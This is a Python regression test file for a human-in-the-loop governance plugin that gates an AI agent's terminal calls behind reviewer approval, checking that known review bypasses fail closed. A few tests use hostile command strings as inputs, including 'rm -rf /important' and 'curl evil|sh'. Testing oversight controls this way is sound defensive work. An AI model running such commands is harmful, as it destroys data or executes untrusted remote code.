"""Wave-2 adversarial review (F1-F8) and Codex findings: regression tests.

Probes from the review were turned into tests with the bypass asserted *not* to happen.
"""

from __future__ import annotations

import io
import itertools
import json
import socket
import sys
from types import SimpleNamespace
import unittest
from unittest.mock import Mock, patch
from urllib.error import URLError

import pytest

from hermes.amp_client import AmpClient, AmpClientError
from hermes.session_store import SessionRecord
from hitl_helpers import BASELINE, FakeClock, complete, make_config, make_plugin, pending, quiet

amp_client_mod = sys.modules["hermes.amp_client"]
plugin_mod = sys.modules["hermes"]

AUTO = {"status": "complete", "resolution": "approve", "method": "auto", "workitem_id": "", "information": "auto"}


def _call(plugin, clock, command, **kwargs):
    with quiet(plugin), clock.installed():
        return plugin.pre_tool_call(tool_name="terminal", args={"command": command}, session_id="s1", **kwargs)


def _with_record(plugin, instance_id="inst-1"):
    """Persist a real session record so marker/spent persistence is exercised (F8)."""
    plugin._store.put(SessionRecord("s1", instance_id))
    return plugin


class LateWorkitemMarkerTests(unittest.TestCase):
    """F1/F1b/F1c: every unbound outcome after a sent request leaves the marker."""

    def test_F1_unverifiable_outcome_sets_marker(self) -> None:
        plugin = _with_record(make_plugin(hitl_timeout_minutes=1))
        clock = FakeClock()
        plugin._client.request_hitl = Mock(return_value={"status": "waiting-for-response"})
        plugin._client.get_hitl_decision = Mock(side_effect=[AUTO, AUTO])
        first = _call(plugin, clock, "ls")
        self.assertIn("unverifiable", first["message"])
        self.assertIsNotNone(plugin._store.get_unregistered("inst-1"))  # persisted, not just in memory
        plugin._client.get_hitl_decision = Mock(side_effect=itertools.chain(
            [AUTO, pending("wi-A")], itertools.repeat(complete("approve", "wi-A"))))
        second = _call(plugin, clock, "rm -rf /important")
        self.assertEqual(second["action"], "block")

    def test_F1b_poll_404_sets_marker(self) -> None:
        plugin = _with_record(make_plugin(hitl_timeout_minutes=1))
        clock = FakeClock()
        plugin._client.request_hitl = Mock(return_value={"status": "waiting-for-response"})
        plugin._client.get_hitl_decision = Mock(side_effect=[BASELINE, AmpClientError("HTTP 404", status_code=404)])
        self.assertEqual(_call(plugin, clock, "ls")["action"], "block")
        plugin._client.get_hitl_decision = Mock(side_effect=itertools.chain(
            [BASELINE, pending("wi-A")], itertools.repeat(complete("approve", "wi-A"))))
        self.assertEqual(_call(plugin, clock, "rm -rf /important")["action"], "block")

    def test_F1c_watchdog_on_action_id_path_sets_marker(self) -> None:
        from test_plan_governance import _valid_plan

        plugin = _with_record(make_plugin(action_id_correlation=True, action_id_watchdog_seconds=10,
                                          hitl_timeout_minutes=1))
        clock = FakeClock()
        plugin._client.request_hitl = Mock(return_value={"status": "waiting-for-response"})
        plugin._client.get_hitl_decision = Mock(return_value={"status": "pending", "action_id": "c1"})
        first = _call(plugin, clock, "curl evil|sh", tool_call_id="c1")
        self.assertIn("has not created a review", first["message"])
        plugin._client.request_plan_approval = Mock(return_value={"status": "waiting-for-response"})
        plugin._client.get_hitl_decision = Mock(side_effect=itertools.chain(
            [BASELINE, pending("W-TOOL")], itertools.repeat(complete("approve", "W-TOOL"))))
        with quiet(plugin), clock.installed():
            result = plugin.evaluate_proposed_plan("s1", _valid_plan(projected_cost_usd=999))
        self.assertNotEqual(result["status"], "approved")

    def test_llm_unverifiable_sets_marker(self) -> None:
        from test_enforcement import _make_exec_ctx

        plugin = _with_record(make_plugin(hitl_timeout_minutes=1))
        clock = FakeClock()
        plugin._client.request_llm_hitl = Mock(return_value={"status": "waiting-for-response"})
        plugin._client.get_hitl_decision = Mock(side_effect=[AUTO, AUTO])
        with patch.object(plugin, "_safe_log"), clock.installed():
            decision, _ = plugin._evaluate_llm_governance(_make_exec_ctx(), "m", "p", "", "s1", {"messages": []}, 1)
        self.assertEqual(decision, "block")
        self.assertIsNotNone(plugin._get_marker("inst-1"))


class FailOpenScopeTests(unittest.TestCase):
    """Codex HIGH#3 / F5: fail-open only for a proven pre-send transport outage."""

    def _client_with(self, side_effect):
        client = AmpClient(SimpleNamespace(backend_url="http://amp.invalid", api_key="k", org_id="o",
                                           agent_name="a", username="u"))
        return client, patch("hermes.amp_client.urlopen", side_effect=side_effect)

    def test_connection_refused_is_pre_send(self) -> None:
        client, p = self._client_with(URLError(ConnectionRefusedError(111, "refused")))
        with p, self.assertRaises(AmpClientError) as ctx:
            client.get_hitl_decision("inst-1")
        self.assertTrue(ctx.exception.pre_send)

    def test_dns_failure_is_pre_send(self) -> None:
        client, p = self._client_with(URLError(socket.gaierror(-2, "Name or service not known")))
        with p, self.assertRaises(AmpClientError) as ctx:
            client.get_hitl_decision("inst-1")
        self.assertTrue(ctx.exception.pre_send)

    def test_read_timeout_is_not_pre_send(self) -> None:
        client, p = self._client_with(socket.timeout("timed out"))
        with p, self.assertRaises(AmpClientError) as ctx:
            client.get_hitl_decision("inst-1")
        self.assertFalse(ctx.exception.pre_send)

    def test_fail_open_allows_only_pre_send_outage(self) -> None:
        cases = {
            "pre-send": (AmpClientError("refused", pre_send=True), None),
            "uncertain": (AmpClientError("read timed out"), "block"),
            "local bug": (TypeError("not JSON serializable"), "block"),
        }
        for label, (error, expected) in cases.items():
            with self.subTest(label):
                plugin = make_plugin(fail_closed=False)
                plugin._client.get_hitl_decision = Mock(return_value=BASELINE)
                plugin._client.request_hitl = Mock(side_effect=error)
                result = _call(plugin, FakeClock(), "ls")
                self.assertEqual(result and result["action"], expected)

    def test_init_without_instance_id_blocks_when_fail_open(self) -> None:
        plugin = make_plugin(fail_closed=False)
        plugin._client.init_instance = Mock(side_effect=AmpClientError("AMP did not return instance_id"))
        clock = FakeClock()
        with patch.object(plugin, "_safe_log"), clock.installed():
            result = plugin.pre_tool_call(tool_name="terminal", args={"command": "ls"}, session_id="s1")
        self.assertEqual(result["action"], "block")

    def test_llm_fail_open_only_on_pre_send_outage(self) -> None:
        from test_enforcement import _make_exec_ctx

        for error, expected in ((AmpClientError("refused", pre_send=True), "allow"),
                                (AmpClientError("read timed out"), "block"),
                                (ValueError("bug"), "block")):
            with self.subTest(error=error):
                plugin = make_plugin(llm_governance_fail_closed=False)
                plugin._client.get_hitl_decision = Mock(return_value=BASELINE)
                plugin._client.request_llm_hitl = Mock(side_effect=error)
                with patch.object(plugin, "_safe_log"), FakeClock().installed():
                    decision, _ = plugin._evaluate_llm_governance(_make_exec_ctx(), "m", "p", "", "s1",
                                                                  {"messages": []}, 1)
                self.assertEqual(decision, expected)


class LockAvailabilityTests(unittest.TestCase):
    """Codex HIGH#2 / F6: no cross-process lock -> no unscoped review."""

    def test_unavailable_review_lock_blocks_unscoped_review(self) -> None:
        plugin = make_plugin()
        plugin._client.get_hitl_decision = Mock(return_value=BASELINE)
        plugin._client.request_hitl = Mock(return_value={"status": "no-hitl"})
        with patch.object(plugin_mod, "_fcntl", None):
            result = _call(plugin, FakeClock(), "ls")
        self.assertEqual(result["action"], "block")
        self.assertIn("lock", result["message"])
        plugin._client.request_hitl.assert_not_called()

    def test_unavailable_review_lock_still_allows_action_id_scoped_review(self) -> None:
        plugin = make_plugin(action_id_correlation=True)
        plugin._client.request_hitl = Mock(return_value={"status": "no-hitl"})
        with patch.object(plugin_mod, "_fcntl", None):
            self.assertIsNone(_call(plugin, FakeClock(), "ls", tool_call_id="c1"))

    def test_store_lock_is_deadline_bound(self) -> None:
        import fcntl
        import os
        import tempfile
        from pathlib import Path
        from hermes.session_store import SessionStore, StoreLockError

        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "sessions.json"
            store = SessionStore(path=path, lock_timeout=0.2)
            fd = os.open(str(path) + ".lock", os.O_RDWR | os.O_CREAT, 0o600)
            fcntl.flock(fd, fcntl.LOCK_EX)
            try:
                with self.assertRaises(StoreLockError):
                    store.put(SessionRecord("s1", "i1"))
            finally:
                fcntl.flock(fd, fcntl.LOCK_UN)
                os.close(fd)

    def test_store_lock_timeout_blocks_the_call(self) -> None:
        from hermes.session_store import StoreLockError

        plugin = make_plugin(fail_closed=False)
        plugin._store.get = Mock(side_effect=StoreLockError("busy"))
        clock = FakeClock()
        with patch.object(plugin, "_safe_log"), clock.installed():
            result = plugin.pre_tool_call(tool_name="terminal", args={"command": "ls"}, session_id="s1")
        self.assertEqual(result["action"], "block")


class _Resp(io.BytesIO):
    status = 200

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


@pytest.mark.parametrize("hook,blackhole_after", [(30, 3), (10, 3), (30, 6), (10, 5), (10, 1)])
def test_F3_blackholed_amp_never_overruns_the_hook(monkeypatch, hook, blackhole_after):
    """Real per-call latency through the real AmpClient (logs, baseline, request, polls)."""
    clock = FakeClock()
    plugin = make_plugin(hitl_poll_interval_seconds=2)
    plugin._client = AmpClient(make_config(hitl_poll_interval_seconds=2))
    monkeypatch.setattr(plugin_mod, "hook_timeout_seconds", lambda: float(hook))
    calls = {"n": 0}

    def fake_urlopen(req, timeout):
        calls["n"] += 1
        if calls["n"] > blackhole_after:
            clock.now += timeout  # blackholed: costs the full socket timeout
            raise socket.timeout("timed out")
        clock.now += 0.2
        url = req.full_url
        if "/api/hitl/request" in url:
            return _Resp(json.dumps({"status": "pending", "workitem_id": "wi-1"}).encode())
        if "get-decision" in url:
            return _Resp(json.dumps({"status": "pending", "workitem_id": "wi-0"}).encode())
        return _Resp(b"{}")

    monkeypatch.setattr(amp_client_mod, "urlopen", fake_urlopen)
    plugin._ensure_instance = lambda *a, **k: "inst-1"
    with clock.installed():
        result = plugin.pre_tool_call(tool_name="terminal", args={"command": "ls"}, session_id="s1")
    assert result["action"] == "block"
    assert clock.elapsed < hook, f"hook {hook}s exceeded: {clock.elapsed:.2f}s"


def test_F3_plan_path_respects_the_tool_deadline(monkeypatch):
    from test_plan_governance import _valid_plan

    clock = FakeClock()
    plugin = make_plugin(hitl_poll_interval_seconds=2, hitl_timeout_minutes=10)
    plugin._client = AmpClient(make_config(hitl_poll_interval_seconds=2))
    monkeypatch.setattr(plugin_mod, "tool_deadline_seconds", lambda: 20.0)

    def fake_urlopen(req, timeout):
        clock.now += timeout  # everything blackholed, including init and submit
        raise socket.timeout("timed out")

    monkeypatch.setattr(amp_client_mod, "urlopen", fake_urlopen)
    with clock.installed():
        result = plugin.evaluate_proposed_plan("s1", _valid_plan())
    assert result["status"] != "approved"
    assert clock.elapsed < 20, f"tool deadline exceeded: {clock.elapsed:.2f}s"


class RetryReuseTests(unittest.TestCase):
    def test_F2_reuse_only_while_still_newest(self) -> None:
        plugin = make_plugin(hitl_timeout_minutes=1)
        clock = FakeClock()
        plugin._client.request_hitl = Mock(return_value={"status": "pending", "workitem_id": "wi-A"})
        plugin._client.get_hitl_decision = Mock(side_effect=itertools.chain([BASELINE],
                                                                            itertools.repeat(pending("wi-A"))))
        self.assertEqual(_call(plugin, clock, "ls")["action"], "block")  # wi-A remembered
        # a newer workitem now exists: the retry must not wait forever on wi-A
        plugin._client.request_hitl = Mock(return_value={"status": "pending", "workitem_id": "wi-C"})
        plugin._client.get_hitl_decision = Mock(side_effect=itertools.chain(
            [complete("reject", "wi-B"), pending("wi-C")], itertools.repeat(complete("approve", "wi-C"))))
        self.assertIsNone(_call(plugin, clock, "ls"))
        plugin._client.request_hitl.assert_called_once()  # opened a new review

    def test_reuse_kept_while_still_newest(self) -> None:
        plugin = make_plugin(hitl_timeout_minutes=1)
        clock = FakeClock()
        plugin._client.request_hitl = Mock(return_value={"status": "pending", "workitem_id": "wi-A"})
        plugin._client.get_hitl_decision = Mock(side_effect=itertools.chain([BASELINE],
                                                                            itertools.repeat(pending("wi-A"))))
        _call(plugin, clock, "ls")
        plugin._client.request_hitl = Mock(side_effect=AssertionError("must reuse"))
        plugin._client.get_hitl_decision = Mock(side_effect=itertools.chain(
            [pending("wi-A")], itertools.repeat(complete("approve", "wi-A"))))
        self.assertIsNone(_call(plugin, clock, "ls"))


class RequestStatusTests(unittest.TestCase):
    """Codex MED: only explicit pending statuses start a review."""

    def test_non_pending_status_with_workitem_blocks(self) -> None:
        for status in ("deny", "cancelled", "banana"):
            with self.subTest(status=status):
                plugin = make_plugin()
                plugin._client.get_hitl_decision = Mock(side_effect=itertools.chain(
                    [BASELINE], itertools.repeat(complete("approve", "wi-1"))))
                plugin._client.request_hitl = Mock(return_value={"status": status, "workitem_id": "wi-1"})
                result = _call(plugin, FakeClock(), "ls")
                self.assertEqual(result["action"], "block")
                self.assertEqual(plugin._client.get_hitl_decision.call_count, 1)  # baseline only

    def test_plan_non_pending_status_with_workitem_is_error(self) -> None:
        from test_plan_governance import _valid_plan

        plugin = make_plugin()
        plugin._client.get_hitl_decision = Mock(side_effect=itertools.chain(
            [BASELINE], itertools.repeat(complete("approve", "wi-1"))))
        plugin._client.request_plan_approval = Mock(return_value={"status": "deny", "workitem_id": "wi-1"})
        with quiet(plugin), FakeClock().installed():
            result = plugin.evaluate_proposed_plan("s1", _valid_plan())
        self.assertNotEqual(result["status"], "approved")


class DeferWordingTests(unittest.TestCase):
    def test_defer_is_not_called_a_reviewer_rejection(self) -> None:
        plugin = make_plugin()
        plugin._client.get_hitl_decision = Mock(side_effect=[BASELINE, complete("defer", "wi-1")])
        plugin._client.request_hitl = Mock(return_value=pending("wi-1"))
        result = _call(plugin, FakeClock(), "ls")
        self.assertIn("deferred", result["message"])
        self.assertNotIn("rejected by AMP HITL review", result["message"])

    def test_bound_call_with_idless_terminal_blocks(self) -> None:
        # F7: K2.2 wins over K2.
        plugin = make_plugin()
        plugin._client.get_hitl_decision = Mock(side_effect=[BASELINE, AUTO])
        plugin._client.request_hitl = Mock(return_value=pending("wi-1"))
        self.assertIn("unverifiable", _call(plugin, FakeClock(), "ls")["message"])


class Wave2bReviewTests(unittest.TestCase):
    """Gate-2/3 review of e6000c7 (MEDIUMs + cheap LOWs)."""

    def test_marker_read_failure_fails_closed(self) -> None:
        from hermes.session_store import StoreLockError

        plugin = make_plugin()
        plugin._client.get_hitl_decision = Mock(return_value=BASELINE)
        plugin._client.request_hitl = Mock(return_value={"status": "no-hitl"})
        plugin._store.get_unregistered = Mock(side_effect=StoreLockError("busy"))
        result = _call(plugin, FakeClock(), "ls")
        self.assertEqual(result["action"], "block")
        plugin._client.request_hitl.assert_not_called()

    def test_unseeded_ledger_never_binds_from_pending(self) -> None:
        from hermes.session_store import StoreLockError

        plugin = make_plugin(hitl_timeout_minutes=1)
        plugin._store.spent_for_instance = Mock(side_effect=StoreLockError("busy"))
        plugin._client.request_hitl = Mock(return_value={"status": "waiting-for-response"})
        plugin._client.get_hitl_decision = Mock(side_effect=itertools.chain(
            [BASELINE, pending("wi-x")], itertools.repeat(complete("approve", "wi-x"))))
        self.assertEqual(_call(plugin, FakeClock(), "ls")["action"], "block")

    def test_refused_outage_does_not_set_marker(self) -> None:
        plugin = make_plugin(fail_closed=False)
        plugin._client.get_hitl_decision = Mock(return_value=BASELINE)
        plugin._client.request_hitl = Mock(side_effect=AmpClientError("refused", pre_send=True))
        clock = FakeClock()
        self.assertIsNone(_call(plugin, clock, "ls"))
        plugin._client.request_hitl = Mock(return_value={"status": "no-hitl"})
        self.assertIsNone(_call(plugin, clock, "pwd"))  # AMP is back: no 5-minute pause

    def test_store_lock_wait_respects_the_governance_deadline(self) -> None:
        import fcntl
        import os
        import tempfile
        import time as _time
        from pathlib import Path
        from hermes.amp_client import request_deadline
        from hermes.session_store import SessionStore, StoreLockError

        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "sessions.json"
            store = SessionStore(path=path, lock_timeout=5.0)
            fd = os.open(str(path) + ".lock", os.O_RDWR | os.O_CREAT, 0o600)
            fcntl.flock(fd, fcntl.LOCK_EX)
            started = _time.monotonic()
            try:
                with request_deadline(_time.time() + 0.3), self.assertRaises(StoreLockError):
                    store.get("s1")
            finally:
                fcntl.flock(fd, fcntl.LOCK_UN)
                os.close(fd)
            self.assertLess(_time.monotonic() - started, 2.0)

    def test_plan_non_dict_response_sets_marker_and_errors(self) -> None:
        from test_plan_governance import _valid_plan

        plugin = make_plugin()
        plugin._client.get_hitl_decision = Mock(return_value=BASELINE)
        plugin._client.request_plan_approval = Mock(return_value=["unexpected"])
        with quiet(plugin), FakeClock().installed():
            result = plugin.evaluate_proposed_plan("s1", _valid_plan())
        self.assertEqual(result["status"], "error")
        self.assertIsNotNone(plugin._get_marker("inst-1"))

    def test_normalizer_crash_blocks_instead_of_raising(self) -> None:
        plugin = make_plugin()
        with patch.object(plugin_mod, "normalize_tool_call", side_effect=RecursionError("deep")):
            result = _call(plugin, FakeClock(), "ls")
        self.assertEqual(result["action"], "block")

    def test_lock_unavailable_message_for_llm_and_plan_names_the_real_fix(self) -> None:
        from test_enforcement import _make_exec_ctx

        plugin = make_plugin(action_id_correlation=True)
        with patch.object(plugin_mod, "_fcntl", None), patch.object(plugin, "_safe_log"), FakeClock().installed():
            decision, reason = plugin._evaluate_llm_governance(_make_exec_ctx(), "m", "p", "", "s1",
                                                               {"messages": []}, 1)
        self.assertEqual(decision, "block")
        self.assertIn("file lock", reason)
        self.assertNotIn("AMP_ACTION_ID_CORRELATION", reason)

    def test_defer_wording_on_llm_and_plan_paths(self) -> None:
        from test_enforcement import _make_exec_ctx
        from test_plan_governance import _valid_plan

        plugin = make_plugin()
        plugin._client.request_llm_hitl = Mock(return_value=pending("wi-1"))
        plugin._client.get_hitl_decision = Mock(side_effect=[BASELINE, complete("defer", "wi-1")])
        with patch.object(plugin, "_safe_log"), FakeClock().installed():
            _, reason = plugin._evaluate_llm_governance(_make_exec_ctx(), "m", "p", "", "s1", {"messages": []}, 1)
        self.assertIn("deferred", reason)
        plugin = make_plugin()
        plugin._client.request_plan_approval = Mock(return_value=pending("wi-2"))
        plugin._client.get_hitl_decision = Mock(side_effect=[BASELINE, complete("defer", "wi-2")])
        with quiet(plugin), FakeClock().installed():
            result = plugin.evaluate_proposed_plan("s1", _valid_plan())
        self.assertIn("deferred", result["reason"])

    def test_finalize_survives_store_lock_error(self) -> None:
        from hermes.session_store import StoreLockError

        plugin = make_plugin()
        plugin._store.get = Mock(side_effect=StoreLockError("busy"))
        plugin.on_session_finalize(session_id="s1")  # must not raise
        plugin.post_tool_call(tool_name="terminal", args={"command": "ls"}, session_id="s1", status="ok")

    def test_hard_deadline_refusal_is_not_a_pre_send_outage(self) -> None:
        import time as _time
        from hermes.amp_client import request_deadline

        client = AmpClient(SimpleNamespace(backend_url="http://amp.invalid", api_key="k"))
        with request_deadline(_time.time() - 1, hard=True), self.assertRaises(AmpClientError) as ctx:
            client.get_hitl_decision("inst-1")
        self.assertFalse(ctx.exception.pre_send)


class Wave2cLowTests(unittest.TestCase):
    """Wave 2c: the three LOWs left by the d5283f5 confirmation review."""

    def test_busy_store_returns_inside_small_hook_windows(self) -> None:
        import fcntl
        import os

        for hook in (1.0, 4.0):
            with self.subTest(hook=hook):
                plugin = make_plugin(fail_closed=False)
                plugin._store.put(SessionRecord("s1", "inst-1"))
                fd = os.open(f"{plugin._store._path}.lock", os.O_RDWR | os.O_CREAT, 0o600)
                fcntl.flock(fd, fcntl.LOCK_EX)  # another Hermes process holds sessions.json
                try:
                    clock = FakeClock()
                    with patch.object(plugin_mod, "hook_timeout_seconds", lambda h=hook: h), \
                            patch.object(plugin, "_safe_log"), clock.installed():
                        result = plugin.pre_tool_call(tool_name="terminal", args={"command": "ls"},
                                                      session_id="s1")
                finally:
                    fcntl.flock(fd, fcntl.LOCK_UN)
                    os.close(fd)
                self.assertEqual(result["action"], "block")
                self.assertLess(clock.elapsed, hook)

    def test_busy_store_message_says_busy_not_unregistered(self) -> None:
        from hermes.session_store import StoreLockError

        plugin = make_plugin()
        plugin._client.get_hitl_decision = Mock(return_value=BASELINE)
        plugin._store.get_unregistered = Mock(side_effect=StoreLockError("busy"))
        message = _call(plugin, FakeClock(), "ls")["message"]
        self.assertIn("session store is busy", message)
        self.assertNotIn("not been registered", message)

    def test_post_tool_call_normalizer_crash_does_not_raise(self) -> None:
        plugin = make_plugin()
        with patch.object(plugin_mod, "normalize_tool_call", side_effect=RecursionError("deep")):
            plugin.post_tool_call(tool_name="terminal", args={"command": "ls"}, session_id="s1", status="ok")


class CancelledUnboundTests(unittest.TestCase):
    """Wave-3 S08c: id-less request (production shape), first poll pending + Cancelled."""

    def test_S08c_cancelled_on_first_pending_poll_blocks_immediately(self) -> None:
        plugin = make_plugin(hitl_timeout_minutes=1)
        plugin._client.request_hitl = Mock(return_value={"status": "waiting-for-response"})
        plugin._client.get_hitl_decision = Mock(side_effect=[
            BASELINE, pending("wi-1", workitem_status="Cancelled"),
        ])
        result = _call(plugin, FakeClock(), "ls")
        self.assertIn("cancelled", result["message"])
        self.assertIn("not rejected by a reviewer", result["message"])
        self.assertEqual(plugin._client.get_hitl_decision.call_count, 2)
        self.assertTrue(plugin._ledger.is_spent("inst-1", "wi-1"))

    def test_S08c_wid_cancelled_status_with_workitem_blocks_immediately(self) -> None:
        plugin = make_plugin(hitl_timeout_minutes=1)
        plugin._client.request_hitl = Mock(return_value={"status": "waiting-for-response"})
        plugin._client.get_hitl_decision = Mock(side_effect=[
            BASELINE, {"status": "cancelled", "workitem_id": "wi-1", "workitem_status": "Cancelled"},
        ])
        result = _call(plugin, FakeClock(), "ls")
        self.assertIn("cancelled", result["message"])
        self.assertEqual(plugin._client.get_hitl_decision.call_count, 2)

    def test_foreign_cancelled_workitem_is_still_skipped(self) -> None:
        plugin = make_plugin(hitl_timeout_minutes=1)
        plugin._client.request_hitl = Mock(return_value={"status": "waiting-for-response"})
        cancelled_old = pending("wi-old", workitem_status="Cancelled")
        plugin._client.get_hitl_decision = Mock(side_effect=[
            cancelled_old, cancelled_old, pending("wi-new"), complete("approve", "wi-new"),
        ])
        self.assertIsNone(_call(plugin, FakeClock(), "ls"))
